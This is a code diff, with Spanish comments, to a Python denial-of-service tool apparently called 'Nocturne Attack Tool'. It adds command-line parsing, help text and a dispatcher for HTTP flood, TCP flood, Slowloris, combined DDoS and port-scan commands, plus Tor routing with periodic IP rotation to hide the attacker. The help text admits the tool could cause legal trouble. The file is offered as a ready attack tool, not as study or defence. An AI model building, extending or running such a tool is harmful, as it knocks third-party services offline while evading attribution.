@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import argparse
 import logging
 import time
 import socket
@@ -14,7 +15,7 @@ from concurrent.futures import ThreadPoolExecutor
 from urllib3.util.retry import Retry
 from urllib3.exceptions import MaxRetryError
 from requests.adapters import HTTPAdapter
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urlparse as parse_url
 
 # Tor configuracion
 TOR_SOCKS_PORT = 9050  # Puerto default del socket
@@ -672,7 +673,280 @@ def ddos_attack(target_url, duration=60):
     print(f"{t.get('requests_second')}: {requests_sent / (end_time - start_time):.2f}")
 
 
-def main():
+def print_help():
+
+    help_text = """
+    
+     .:'           NOCTURNE ATTACK            `:.
+     ::'                                      `::
+     :: :.      .:!!.            .:!!.      .: ::
+      `:. `:.    !::!          !::!    .:'  .:'
+       `::. `::  !:::'!.      .!':::!  ::' .::'
+         `::.`::.  `!:'`:::::'':!'  .::'.::'
+           `:.  `::::'  `!!'  '::::'   ::'
+           :'*:::.   .:'  !!  `:.  .:::*`:
+           ::  HHH::.   ` !! '   .::HHH ::
+           ::: `H TH::.  `!!  .::HT H' :::
+           ::..  `THHH:`:   :':HHHT'  ..::
+           `::      `T: `. .' :T'      ::'
+             `:. .   :  >  <  :   . .:'
+               `::'    \    /    `::'
+                :'  .`. \__/ .'.  `:
+                 :' ::.       .:: `:
+                 :' `:::     :::' `:
+                  `.  ``     ''  .'
+                   :`...........':
+                   ` :`.     .': '
+                    `:  `''''  :'   @Nocturne
+    
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                     Nocturne Attack Tool - Help                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+   MODO DE USO:
+  python main.py [OPCIONES] [TARGET] [COMANDO] [PARÁMETROS]
+
+   EJEMPLOS RÁPIDOS:
+  Escanear puertos:         python nocturne.py example.com scan --start-port 80 --end-port 100
+  Ataque HTTP:              python nocturne.py example.com http --requests 1000 --tor
+  Ataque TCP:               python nocturne.py example.com tcp --port 80 --connections 500
+  Ataque Slowloris:         python nocturne.py example.com slowloris --sockets 200
+  Ataque DDoS:              python nocturne.py example.com ddos --duration 120 --tor
+
+  OPCIONES GENERALES:
+  TARGET                    URL o dirección IP del objetivo
+  -l, --language {es,en}    Idioma de la interfaz (predeterminado: es)
+  --tor                     Usar red Tor para el anonimato
+  --tor-rotation SEGS       Rotar IP de Tor cada X segundos (0=desactivado, predet: 60)
+
+   COMANDOS DISPONIBLES:
+  scan      Escaneo de puertos
+  http      Ataque HTTP Flood
+  tcp       Ataque TCP Flood
+  slowloris Ataque Slowloris
+  ddos      Ataque DDoS combinado
+
+    Para más ayuda sobre un comando específico:
+   python main.py [COMANDO] --help
+
+    ADVERTENCIA: Esta herramienta podria meterte en problemas legales.
+"""
+    print(help_text)
+    sys.exit(0)
+
+def print_command_help(command):
+    """Muestra ayuda detallada para un comando específico."""
+    helps = {
+        'scan': """
+📌 ESCANEO DE PUERTOS
+  Uso: python main.py TARGET scan [OPCIONES]
+
+  Opciones:
+    --start-port NUM  Puerto inicial (predeterminado: 1)
+    --end-port NUM    Puerto final (predeterminado: 1000)
+
+  Ejemplo:
+    python main.py example.com scan --start-port 80 --end-port 1000
+""",
+        'http': """
+📌 HTTP FLOOD
+  Uso: python main.py TARGET http --requests NUM [OPCIONES]
+
+  Opciones requeridas:
+    --requests NUM    Número de peticiones a enviar
+
+  Opcionales:
+    --delay SEGS      Segundos entre peticiones (pred: 0.1)
+
+  Ejemplo con Tor:
+    python main.py example.com http --requests 5000 --delay 0.05 --tor
+""",
+        'tcp': """
+📌 TCP FLOOD
+  Uso: python main.py TARGET tcp --port NUM --connections NUM [OPCIONES]
+
+  Opciones requeridas:
+    --port NUM        Puerto objetivo
+    --connections NUM Número de conexiones
+
+  Opcionales:
+    --message TEXTO   Mensaje a enviar (opcional)
+
+  Ejemplo:
+    python main.py example.com tcp --port 80 --connections 1000
+""",
+        'slowloris': """
+📌 SLOWLORIS
+  Uso: python main.py TARGET slowloris [OPCIONES]
+
+  Opciones:
+    --sockets NUM     Número de sockets a usar (pred: 150)
+
+  Ejemplo con rotación de Tor:
+    python main.py example.com slowloris --sockets 200 --tor --tor-rotation 30
+""",
+        'ddos': """
+📌 ATAQUE DDoS
+  Uso: python main.py TARGET ddos [OPCIONES]
+
+  Opciones:
+    --duration SEGS   Duración del ataque en segundos (pred: 60)
+
+  Ejemplo con Tor:
+    python main.py example.com ddos --duration 300 --tor
+"""
+    }
+    
+    if command in helps:
+        print(helps[command])
+    else:
+        print(f"Comando desconocido: {command}")
+    sys.exit(0)
+
+def parse_arguments():
+    """Parse command line arguments."""
+    # Crear el parser principal
+    parser = argparse.ArgumentParser(
+        description='Herramienta de pruebas de red',
+        add_help=False
+    )
+    
+    # Manejar el comando de ayuda global
+    if len(sys.argv) == 1 or sys.argv[1] in ['-h', '--help']:
+        print_help()
+    
+    # Manejar ayuda de comandos específicos
+    if len(sys.argv) > 1 and sys.argv[1] in ['scan', 'http', 'tcp', 'slowloris', 'ddos'] and \
+       (len(sys.argv) == 2 or sys.argv[2] in ['-h', '--help']):
+        print_command_help(sys.argv[1])
+    
+    # Grupo para argumentos generales
+    general_group = parser.add_argument_group('Opciones generales')
+    general_group.add_argument('target', nargs='?', help='URL o IP del objetivo')
+    general_group.add_argument('-l', '--language', choices=['es', 'en'], default='es',
+                      help='Idioma de la interfaz')
+    general_group.add_argument('--tor', action='store_true',
+                      help='Usar red Tor para las conexiones')
+    general_group.add_argument('--tor-rotation', type=int, default=60,
+                      help='Intervalo de rotación de IPs de Tor (0=desactivado)')
+    general_group.add_argument('-h', '--help', action='store_true',
+                      help='Mostrar este mensaje de ayuda y salir')
+    
+    # Subcomandos
+    subparsers = parser.add_subparsers(
+        dest='command',
+        title='comandos disponibles',
+        description='Los siguientes comandos están disponibles:',
+        metavar='COMANDO',
+        required=False
+    )
+    
+    # Comando: scan
+    scan_help = '''
+    Escanea puertos en un objetivo.
+    
+    Ejemplo:
+      python main.py example.com scan --start-port 1 --end-port 1000
+    '''
+    scan_parser = subparsers.add_parser(
+        'scan',
+        help='Escaneo de puertos',
+        description='Escanea puertos en un objetivo',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='Ejemplo: python main.py example.com scan --start-port 1 --end-port 1000'
+    )
+    scan_parser.add_argument('--start-port', type=int, default=1, 
+                           help='Puerto inicial (predeterminado: 1)')
+    scan_parser.add_argument('--end-port', type=int, default=1000, 
+                           help='Puerto final (predeterminado: 1000)')
+    
+    # Comando: http
+    http_help = '''
+    Realiza un ataque HTTP Flood.
+    
+    Ejemplo:
+      python main.py example.com http --requests 1000 --delay 0.1 --tor
+    '''
+    http_parser = subparsers.add_parser(
+        'http', 
+        help='Ataque HTTP Flood',
+        description='Realiza un ataque HTTP Flood al objetivo',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='Ejemplo: python main.py example.com http --requests 1000 --delay 0.1'
+    )
+    http_parser.add_argument('--requests', type=int, required=True, 
+                           help='Número de requests a enviar (requerido)')
+    http_parser.add_argument('--delay', type=float, default=0.1, 
+                           help='Segundos entre requests (predeterminado: 0.1)')
+    
+    # Comando: tcp
+    tcp_help = '''
+    Realiza un ataque TCP Flood.
+    
+    Ejemplo:
+      python main.py example.com tcp --port 80 --connections 100 --message "test"
+    '''
+    tcp_parser = subparsers.add_parser(
+        'tcp', 
+        help='Ataque TCP Flood',
+        description='Realiza un ataque TCP Flood al objetivo',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='Ejemplo: python main.py example.com tcp --port 80 --connections 100'
+    )
+    tcp_parser.add_argument('--port', type=int, required=True, 
+                          help='Puerto objetivo (requerido)')
+    tcp_parser.add_argument('--connections', type=int, required=True, 
+                          help='Número de conexiones (requerido)')
+    tcp_parser.add_argument('--message', default='', 
+                          help='Mensaje a enviar (opcional)')
+    
+    # Comando: slowloris
+    slowloris_help = '''
+    Realiza un ataque Slowloris.
+    
+    Ejemplo:
+      python main.py example.com slowloris --sockets 200
+    '''
+    slowloris_parser = subparsers.add_parser(
+        'slowloris', 
+        help='Ataque Slowloris',
+        description='Realiza un ataque Slowloris al objetivo',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='Ejemplo: python main.py example.com slowloris --sockets 200'
+    )
+    slowloris_parser.add_argument('--sockets', type=int, default=150, 
+                                help='Número de sockets a usar (predeterminado: 150)')
+    
+    # Comando: ddos
+    ddos_help = '''
+    Realiza un ataque DDoS combinando múltiples técnicas.
+    
+    Ejemplo:
+      python main.py example.com ddos --duration 60 --tor
+    '''
+    ddos_parser = subparsers.add_parser(
+        'ddos', 
+        help='Ataque DDoS',
+        description='Realiza un ataque DDoS combinando múltiples técnicas',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='Ejemplo: python main.py example.com ddos --duration 60'
+    )
+    ddos_parser.add_argument('--duration', type=int, default=60, 
+                           help='Duración del ataque en segundos (predeterminado: 60)')
+    
+    args = parser.parse_args()
+    
+    # Si se especifica un objetivo pero no un comando, mostrar mensaje de ayuda
+    if args.target and not args.command:
+        print("Error: Se requiere especificar un comando cuando se proporciona un objetivo.")
+        print("Ejemplo: python main.py example.com scan")
+        parser.print_help()
+        sys.exit(1)
+        
+    return args
+
+def interactive_mode():
+    """Modo interactivo con menú."""
     # Mostrar el banner
     print_banner()
     
@@ -731,12 +1005,102 @@ def main():
     except Exception as e:
         print(f"{t.get('error_general')}: {e}")
 
-    # Ask to restart
+    # Preguntar si desea reiniciar
     answer = input(f"\n{t.get('restart')}: ").strip().lower()
     if answer in ['s', 'si', 'y', 'yes']:
         restart_program()
     else:
         print(t.get('exiting'))
 
+def main():
+    """Función principal."""
+    args = parse_arguments()
+    
+    # Configurar idioma
+    Config.LANGUAGE = 'spanish' if args.language == 'es' else 'english'
+    
+    # Configurar Tor si está habilitado
+    Config.USE_TOR = args.tor
+    Config.TOR_ROTATION_INTERVAL = args.tor_rotation
+    
+    # Inicializar Tor si está habilitado
+    tor_controller = None
+    if Config.USE_TOR:
+        tor_controller = TorController()
+        try:
+            with tor_controller as controller:
+                if controller:
+                    ip = controller.get_current_ip()
+                    if ip:
+                        print(f"[+] Usando Tor. IP actual: {ip}")
+                        
+                        # Iniciar rotación automática de IP si está habilitada
+                        if Config.TOR_ROTATION_INTERVAL > 0:
+                            def rotate_ip_periodically():
+                                while True:
+                                    time.sleep(Config.TOR_ROTATION_INTERVAL)
+                                    with TorController() as tc:
+                                        if tc:
+                                            tc.new_identity()
+                            
+                            rotation_thread = threading.Thread(
+                                target=rotate_ip_periodically,
+                                daemon=True
+                            )
+                            rotation_thread.start()
+                            print(f"[+] Rotación automática de IP cada {Config.TOR_ROTATION_INTERVAL} segundos")
+                    else:
+                        print("[-] No se pudo obtener la IP de Tor")
+                else:
+                    print("[-] No se pudo conectar al control de Tor")
+        except Exception as e:
+            print(f"[-] Error al conectar con Tor: {e}")
+    
+    # Si no hay argumentos o no se especificó un comando, entrar en modo interactivo
+    if not args.command and not args.target:
+        return interactive_mode()
+    
+    # Verificar que se haya proporcionado un objetivo
+    if not args.target:
+        print("Error: Se requiere un objetivo. Use --help para ayuda.")
+        return
+    
+    try:
+        # Ejecutar el comando correspondiente
+        if args.command == 'scan':
+            open_ports = port_scan(args.target, args.start_port, args.end_port)
+            print(f"\n[+] Escaneo completado. Puertos abiertos: {open_ports}")
+            
+        elif args.command == 'http':
+            print(f"[+] Iniciando HTTP Flood a {args.target} con {args.requests} requests...")
+            http_flood(args.target, args.requests, args.delay)
+            
+        elif args.command == 'tcp':
+            print(f"[+] Iniciando TCP Flood a {args.target}:{args.port} con {args.connections} conexiones...")
+            tcp_flood(args.target, args.port, args.connections, args.message)
+            
+        elif args.command == 'slowloris':
+            print(f"[+] Iniciando ataque Slowloris a {args.target} con {args.sockets} sockets...")
+            slowloris_attack(args.target, args.sockets)
+            
+        elif args.command == 'ddos':
+            print(f"[+] Iniciando ataque DDoS a {args.target} por {args.duration} segundos...")
+            ddos_attack(args.target, args.duration)
+            
+        else:
+            print("Comando no reconocido. Use --help para ver la ayuda.")
+            
+    except KeyboardInterrupt:
+        print("\n[!] Operación cancelada por el usuario")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!] Aplicación terminada por el usuario")
+        sys.exit(0)
+    except Exception as e:
+        print(f"[!] Error crítico: {e}")
+        sys.exit(1)
